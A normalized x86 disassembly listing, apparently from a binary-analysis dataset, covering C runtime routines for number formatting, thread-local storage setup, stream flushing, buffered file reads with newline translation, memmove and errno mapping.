je r-xdata
mov esi 0x7fffffff
mov [ ebp - 0xc ] 0xa
sub eax 0x3
jne r-xdata
push edi
or [ ebp - 0x3 ] 0x1
lea edi [ ebp - 0x247 ]
mov [ ebp - 0x8 ] edi
lea eax [ ebp - 0x248 ]
push eax
call [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
and [ ebp - 0x24 ] 0x0
mov [ ebp - 0x8 ] ecx
movsx eax [ eax ]
jmp r-xdata
movsx eax [ eax ]
shr eax 0x1
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0x248 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
sub eax 0xc
jne r-xdata
lea eax [ ebp - 0x49 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x1c ] 0x0
mov eax esi
or eax edi
jne r-xdata
test [ ebp - 0x3 ] 0x80
jne r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
mov [ ebp - 0x2c ] 0x27
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x40
je r-xdata
test [ ebp - 0x4 ] 0x830
jne r-xdata
mov eax [ ebp - 0xc ]
cdq
push edx
push eax
push edi
push esi
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
call sub_4071d0
push [ ebp - 0x3c ]
mov ebx eax
add ebx 0x30
push [ ebp - 0x40 ]
push edi
push esi
call sub_407160
cmp ebx 0x39
mov esi eax
mov edi edx
jle r-xdata
mov eax esi
or eax edi
je r-xdata
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x24 ] 0x1
mov eax ecx
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
test [ ebp - 0x4 ] 0x80
mov [ ebp - 0xc ] 0x10
je r-xdata
mov esi [ ebp - 0x20 ]
sub esi [ ebp - 0x1c ]
sub esi [ ebp - 0xc ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
or [ ebp - 0x3 ] 0x8
mov eax [ ebp - 0x8 ]
dec [ ebp - 0x8 ]
mov [ eax ] bl
jmp r-xdata
add ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x49 ]
sub eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test [ ebp - 0x3 ] 0x2
mov [ ebp - 0xc ] eax
je r-xdata
sub eax ecx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
sub eax ecx
sar eax 0x1
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x16 ]
push [ ebp + 0x8 ]
push [ ebp - 0x1c ]
push eax
call sub_404ac0
add esp 0x10
test bl 0x8
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_404a8f
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x16 ] 0x2d
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
test eax eax
jg r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx ] 0x30
jne r-xdata
inc eax
jmp r-xdata
inc eax
inc eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x16 ] 0x2b
jmp r-xdata
mov [ ebp - 0x1c ] 0x1
dec [ ebp - 0x8 ]
inc eax
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0x30
test eax eax
jne r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
mov edx esi
dec esi
test edx edx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_404ac0
add esp 0x10
cmp [ ebp - 0xc ] 0x0
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x30
call sub_404a8f
add esp 0x10
mov [ ebp - 0x16 ] 0x20
lea eax [ ebp - 0x14 ]
push eax
push [ ebp + 0x8 ]
push esi
push 0x20
call sub_404a8f
add esp 0x10
mov eax [ ebp - 0xc ]
mov ebx [ ebp - 0x8 ]
lea edi [ eax - 0x1 ]
test [ ebp - 0x4 ] 0x4
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_404ac0
add esp 0x10
mov eax edi
dec edi
test eax eax
jne r-xdata
mov ax [ ebx ]
inc ebx
push eax
lea eax [ ebp - 0x38 ]
push eax
inc ebx
call sub_40709b
pop ecx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_404a5a
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
dec [ ecx + 0x4 ]
js r-xdata
push ecx
push [ ebp + 0x8 ]
call sub_404201
pop ecx
pop ecx
mov edx [ ecx ]
mov al [ ebp + 0x8 ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ eax ]
pop ebp
retn
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
mov eax [ ebp + 0x10 ]
jne r-xdata
sub_404a8f
push esi
push edi
mov edi [ esp + 0x10 ]
mov eax edi
dec edi
test eax eax
jle r-xdata
pop edi
pop esi
retn
mov esi [ esp + 0x18 ]
mov eax edi
dec edi
test eax eax
jg r-xdata
push esi
push [ esp + 0x18 ]
push [ esp + 0x14 ]
call sub_404a5a
add esp 0xc
cmp [ esi ] 0xffffffff
je r-xdata
sub_404ac0
push ebx
mov ebx [ esp + 0xc ]
mov eax ebx
dec ebx
push esi
push edi
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esp + 0x1c ]
mov esi [ esp + 0x10 ]
mov eax ebx
dec ebx
test eax eax
jg r-xdata
movsx eax [ esi ]
push edi
inc esi
push [ esp + 0x1c ]
push eax
call sub_404a5a
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_404b46
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_404bfc
push esi
call sub_403c63
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
xor eax eax
pop esi
retn
push 0x74
push 0x1
call sub_407245
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_404c50
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
push 0x1
mov [ esi ] eax
pop eax
pop esi
retn
sub_404c63
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
mov eax esi
pop edi
pop esi
retn
push 0x74
push 0x1
call sub_407245
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
push 0x10
call sub_403c1a
pop ecx
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
test eax eax
je r-xdata
push esi
call sub_404c50
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_404cca
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_407245
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_407245
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_403c1a
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_404d86
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_403c8c
pop ecx
retn
sub_404db5
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_403c8c
pop ecx
retn
sub_404dd8
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_403ced
pop ecx
retn
sub_404e07
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_403ced
pop ecx
retn
sub_404e2a
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x9
call sub_403c8c
push esi
call sub_407391
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_403ced
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push esi
push eax
call sub_4073bc
push 0x9
call sub_403ced
add esp 0xc
pop esi
retn
sub_404e72
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4080f2
push esi
call sub_404ecf
push esi
mov edi eax
call sub_408151
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_404ecf
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_4080b0
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_405735
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_4080b0
push 0x1
mov edi eax
call sub_4080b0
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_4080b0
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_408031
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_404f52
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_404e2a
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_404f7d
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
push esi
call sub_404d86
push esi
call sub_404fac
push esi
mov edi eax
call sub_404dd8
add esp 0xc
mov eax edi
pop edi
pop esi
retn
push esi
call sub_40503f
pop ecx
pop esi
retn
sub_404fac
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_404fda
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_408173
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_404fda
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_405c4d
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_40503f
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_403c8c
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_403ced
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_404db5
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_404e07
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_404fac
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_404fac
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_4050e3
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
or eax 0xffffffff
pop esi
retn
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or al 0x1
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
or al 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_406fab
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push [ esi + 0x10 ]
call sub_4051bf
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0xc ]
test dl 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
mov ecx [ esi + 0x10 ]
push edi
cmp ecx 0xffffffff
je r-xdata
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
pop esi
retn
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
mov edi rw-data
mov edi ecx
sar edi 0x5
and ecx 0x1f
mov edi [ edi * 4 + rw-data ]
lea ecx [ ecx + ecx * 8 ]
lea edi [ edi + ecx * 4 ]
jmp r-xdata
test ch 0x4
jne r-xdata
or dh 0x20
mov [ esi + 0xc ] edx
mov cl [ edi + 0x4 ]
pop edi
and cl 0x82
cmp cl 0x82
jne r-xdata
mov [ esi + 0x18 ] 0x1000
sub_4051bf
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4080f2
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_405224
push esi
mov edi eax
call sub_408151
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_405224
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x8 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edx ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea esi [ eax + eax * 8 ]
mov eax [ ecx * 4 + rw-data ]
lea edi [ ecx * 4 + rw-data ]
shl esi 0x2
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x2
jne r-xdata
test cl 0x48
je r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov eax [ edi ]
push [ ebp + 0x10 ]
push edx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ edi ]
mov edx [ ebp - 0xc ]
add [ ebp - 0x8 ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ eax + esi + 0x4 ]
test al 0x80
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
dec [ ebp + 0x10 ]
mov [ ebx ] al
mov eax [ edi ]
lea edx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0x8 ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
je r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
mov [ eax ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and al 0xfb
cmp [ ebx ] 0xa
jne r-xdata
push eax
call sub_405735
pop ecx
or eax 0xffffffff
jmp r-xdata
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ebx
mov eax [ ebp + 0x10 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
mov eax [ edi ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp + 0x10 ] ecx
jae r-xdata
mov [ ebx ] al
inc ebx
inc [ ebp + 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push 0x0
push eax
inc [ ebp + 0x10 ]
lea eax [ ebp - 0x1 ]
push 0x1
push eax
mov eax [ edi ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ebp + 0x10 ] ecx
jb r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebp + 0x10 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc ebx
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40581f
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ ebx ] 0xd
mov ecx [ edi ]
inc ebx
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_405400
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_405460 ]
jmp [ ecx * 4 + jump_table_4054dc ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405548 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_405548 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_4056e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4055e8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405548 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405548 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_405548 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4056e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4056e0 ]
sub_405735
push esi
call sub_4057b1
mov ecx [ esp + 0x8 ]
xor esi esi
mov [ eax ] ecx
mov eax rw-data
call sub_4057a8
mov ecx [ esi * 8 + rw-data ]
pop esi
mov [ eax ] ecx
retn
add eax 0x8
inc esi
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
call sub_4057a8
mov [ eax ] 0x16
pop esi
retn
cmp ecx 0xca
ja r-xdata
call sub_4057a8
mov [ eax ] 0xd
pop esi
retn
call sub_4057a8
mov [ eax ] 0x8
pop esi
retn
sub_4057ba
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_4057a8
mov [ eax ] 0x9
call sub_4057b1
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_4080f2
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push esi
call sub_40581f
push esi
mov edi eax
call sub_408151
add esp 0x14
mov eax edi
pop edi
pop esi
retn
sub_40581f
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_4080b0
cmp eax 0xffffffff
pop ecx
jne r-xdata
push [ esp + 0x14 ]
push 0x0
push [ esp + 0x18 ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_4057a8
mov [ eax ] 0x9
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
and esi 0x1f
sar ecx 0x5
mov eax esi
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
and [ ecx + eax * 4 + 0x4 ] 0xfd
lea eax [ ecx + eax * 4 + 0x4 ]
mov eax edi
push eax
call sub_405735
pop ecx
test eax eax
je r-xdata
pop edi
pop esi
retn
sub_405892
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_404d86
push esi
call sub_4058b4
push esi
mov edi eax
call sub_404dd8
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_4058b4
push ebp
